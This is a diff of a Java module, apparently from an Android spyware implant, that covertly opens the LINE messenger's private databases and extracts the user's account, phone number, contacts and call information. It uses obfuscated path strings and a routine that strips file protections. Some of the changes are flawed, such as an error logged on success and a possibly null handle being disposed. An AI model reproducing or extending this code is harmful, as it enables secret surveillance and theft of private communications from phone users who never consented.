@@ -24,15 +24,15 @@ public class ChatLine extends SubModuleChat {
 
     private static final int PROGRAM = 0x0d;
     String pObserving = M.e("jp.naver.line.android");
-    String dbFile = M.e("/data/data/jp.naver.line.android/databases/naver_line");
-    String dbAccountFile = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome");
+    static String dbFile = M.e("/data/data/jp.naver.line.android/databases/naver_line");
+    static String  dbAccountFile = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome");
     Semaphore readChatSemaphore = new Semaphore(1, true);
     private Date lastTimestamp;
     private long lastLine;
     private static String account = "";
     private static String account_mid = M.e("mid");
 
-    private static GenericSqliteHelper helper;
+    private GenericSqliteHelper helper;
 
     @Override
     public int getProgramId() {
@@ -90,7 +90,7 @@ public class ChatLine extends SubModuleChat {
 		        return;
 	        }
 			try {
-				account = readMyPhoneNumber(mymids);
+				account = readMyPhoneNumber(helper, mymids);
 				long lastmessage = readLineMessageHistory();
 
 				if (lastmessage > lastLine) {
@@ -114,7 +114,44 @@ public class ChatLine extends SubModuleChat {
 
     }
 
-    static public String readMyPhoneNumber(List<String> mymids) {
+
+    public static String getAccount() {
+        //String dbAccountFile_local = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome-journal");
+        if(account.equals("")){
+
+            Path.unprotect(dbAccountFile, 3, true);
+            GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbAccountFile);
+            if (helper == null) {
+                return null;
+            }
+            List<String> mymids= new ArrayList<String>();
+            try {
+                RecordStringVisitor visitor = new RecordStringVisitor("mid");
+                helper.traverseRecords("my_home_status", visitor);
+
+                mymids = visitor.getRecords();
+
+            }finally{
+                helper.disposeDb();
+            }
+
+            helper = GenericSqliteHelper.openCopy(dbFile);
+            try {
+                if (helper != null) {
+                    if (Cfg.DEBUG) {
+                        Check.log(TAG + " (ChatLine) Error, file not readable: " + dbFile);
+                    }
+
+                    account = readMyPhoneNumber(helper, mymids);
+                }
+            }finally{
+                helper.disposeDb();
+            }
+        }
+        return account;
+    }
+
+    static public String readMyPhoneNumber(GenericSqliteHelper helper, List<String> mymids) {
 
         RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
         helper.traverseRecords(M.e("contacts"), visitorContacts);
@@ -167,32 +204,6 @@ public class ChatLine extends SubModuleChat {
         }
     }
 
-	public static String getAccount() {
-		String dbAccountFile_local = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome-journal");
-		if(account.equals("")){
-
-			Path.unprotect(dbAccountFile_local, 3, true);
-			helper = GenericSqliteHelper.openCopy(dbAccountFile_local);
-			if (helper == null) {
-				return null;
-			}
-			List<String> mymids= new ArrayList<String>();
-			try {
-				RecordStringVisitor visitor = new RecordStringVisitor("mid");
-				helper.traverseRecords("my_home_status", visitor);
-
-				mymids = visitor.getRecords();
-			}finally{
-				helper.disposeDb();
-			}
-			try {
-				account = readMyPhoneNumber(mymids);
-			}finally{
-				helper.disposeDb();
-			}
-		}
-		return account;
-	}
 
 	static public boolean getCurrentCall(final CallInfo call) {
 		String dbFile_local = M.e("/data/data/jp.naver.line.android/databases/naver_line");
@@ -236,15 +247,15 @@ public class ChatLine extends SubModuleChat {
 					return call.id;
 				}
 			};
-			if(helper == null){
-				helper = GenericSqliteHelper.openCopy(dbFile_local);
+
+            GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile_local);
 				if (helper == null) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (getCurrentCall) Error, file not readable: " + dbFile_local);
 					}
 					return false;
 				}
-			}
+
 			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
 			return call.valid;
 
